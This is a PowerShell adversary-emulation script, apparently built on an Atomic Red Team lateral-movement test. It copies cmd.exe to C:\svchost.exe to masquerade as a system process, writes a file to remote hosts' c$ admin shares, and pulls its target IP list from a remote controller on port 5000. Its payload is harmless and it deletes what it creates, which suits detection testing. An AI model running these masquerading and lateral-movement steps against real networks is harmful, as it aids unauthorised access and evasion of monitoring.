#Title: invoke-copy_svchost
#Technique: T1105
#Tactic: TA0008

function invoke-copy_svchost
    {

    <#
.SYNOPSIS
svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
Upon successful execution, this will rename cmd.exe as svchost.exe and move it to c:\,
then execute svchost.exe with output to a txt file.

.DESCRIPTION
Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)

.LINK

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-12---svchost-writing-a-file-to-a-unc-path
#>

param
(
[parameter(Mandatory=$true)][String]$Target    
)

$good = $false
$results = $null
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {       
        
    copy  $Env:SystemDrive\Windows\System32\cmd.exe $Env:SystemDrive\svchost.exe
    sleep 1    
    $variable = "\\"+$Target+"\c$\T1105.txt"
    $argumento = '/c' , 'echo write on target '+$variable+': C:\ > '+$variable
    Start-Process $Env:SystemDrive\svchost.exe  $argumento     
    sleep 1 
    $results = Get-Content  $variable
    if (!($results -eq $null) )
        {
        $good = $true 
        Remove-Item -Path  $variable
        Remove-Item -Path  $Env:SystemDrive\svchost.exe
                  
        }
    else
        {
        $results = "an error ocurred while copying file"            
        }

    
        

     }
else
    {
     $results = "Administrator or System privileges necessary."
    }





    return @{results=$results;success=$good}
    }


#Main program
$execute = {

}
#GiveMeData if needed
$final_results = ""
$final_good = $false
$uri = "http://"+$global:remoteip+":5000/getdata"

#give me IP
$resp = invoke-webrequest -UseBasicParsing -Method POST -Body @{id=$global:id;ip=""} $uri
$ipaddresses = $resp.Content | ConvertFrom-Json



#lateral movement
foreach($elem in $ipaddresses.datastore)
    {
    $execute = invoke-copy_svchost -target $elem.ip
    $final_results += $execute.results
    if($execute.success)
        {
        $final_good = $true
        break
        }

    }



#PutData if needed
  # if($execute.success)
  # {

  # }

return @{results=$final_results;success=$final_good}
